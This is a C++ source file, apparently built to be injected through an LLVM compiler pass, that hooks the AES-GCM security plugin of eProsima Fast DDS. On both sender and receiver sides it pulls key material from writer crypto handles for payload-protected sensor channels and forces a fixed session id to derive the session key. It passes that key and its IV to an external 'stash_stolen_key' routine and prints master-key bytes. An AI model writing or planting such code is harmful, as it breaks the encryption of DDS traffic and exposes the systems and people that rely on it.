#include <security/cryptography/AESGCMGMAC_KeyFactory.h>
#include <security/cryptography/AESGCMGMAC_Types.h>
#include <security/cryptography/AESGCMGMAC_Transform.h>

#include <array>
#include <cstring>
#include <cstdio>
#include <mutex>

using namespace eprosima::fastrtps::rtps::security;

extern "C" void stash_stolen_key(const uint8_t* key, const uint8_t* iv);

// [Core Filter Macro] Flag to check if the channel protects the actual sensor data payload
#ifndef PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED
#define PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED (1UL << 0)
#endif

// =====================================================================
// [Transmitter (TX) Phase 2] Arm the generated User Payload key
// =====================================================================
extern "C" void steal_and_bake_key(void* raw_handle) {
    if (raw_handle == nullptr) return;
    AESGCMGMAC_WriterCryptoHandle* local_writer = static_cast<AESGCMGMAC_WriterCryptoHandle*>(raw_handle);
    if (local_writer->nil()) return;

    std::unique_lock<std::mutex> lock((*local_writer)->mutex_);
    
    // [User Payload Filter] Ignore the channel immediately if it is not a genuine sensor data channel
    uint32_t attrs = (*local_writer)->EndpointPluginAttributes;
    if ((attrs & PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED) == 0) return;

    if ((*local_writer)->EntityKeyMaterial.empty()) return;
    auto& keyMat = (*local_writer)->EntityKeyMaterial.at(0);

    uint32_t force_sync_id = 7777; 
    std::array<uint8_t, 32> precomputed_session_key;
    AESGCMGMAC_Transform temp_transform;
    temp_transform.compute_sessionkey(precomputed_session_key, keyMat, force_sync_id);

    std::array<uint8_t, 12> iv = {0};
    std::memcpy(iv.data(), &force_sync_id, 4);
    stash_stolen_key(precomputed_session_key.data(), iv.data());

    printf("\n==================================================\n");
    printf("[LLVM PASS HACK] TX payload-specific dynamic session key armed successfully!\n");
    printf("   - TX Master Sender Key (First 8 bytes) : ");
    for(int i=0; i<8; i++) printf("%02X ", keyMat.master_sender_key[i]);
    printf("\n==================================================\n\n");
}

// =====================================================================
// [Receiver (RX) Phase 4] Arm the User Payload key delivered over the network
// =====================================================================
extern "C" void steal_and_bake_key_rx(void* raw_handle) {
    if (raw_handle == nullptr) return;
    
    DatawriterCryptoHandle* base_handle = static_cast<DatawriterCryptoHandle*>(raw_handle);
    AESGCMGMAC_WriterCryptoHandle& remote_writer = AESGCMGMAC_WriterCryptoHandle::narrow(*base_handle);
    if (remote_writer.nil()) return;

    std::unique_lock<std::mutex> lock(remote_writer->mutex_);
    
    // [User Payload Filter] Intercept only genuine data channel keys on the receiver side as well
    uint32_t attrs = remote_writer->EndpointPluginAttributes;
    if ((attrs & PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED) == 0) return;

    if (remote_writer->Entity2RemoteKeyMaterial.empty()) return;
    auto& keyMat = remote_writer->Entity2RemoteKeyMaterial.back();

    uint32_t force_sync_id = 7777; 
    std::array<uint8_t, 32> precomputed_session_key;
    AESGCMGMAC_Transform temp_transform;
    temp_transform.compute_sessionkey(precomputed_session_key, keyMat, force_sync_id);

    std::array<uint8_t, 12> iv = {0};
    std::memcpy(iv.data(), &force_sync_id, 4);
    stash_stolen_key(precomputed_session_key.data(), iv.data());

    printf("\n==================================================\n");
    printf("[LLVM PASS HACK] RX payload-specific dynamic session key armed successfully!\n");
    printf("   - RX Master Sender Key (First 8 bytes) : ");
    for(int i=0; i<8; i++) printf("%02X ", keyMat.master_sender_key[i]);
    printf("\n==================================================\n\n");
}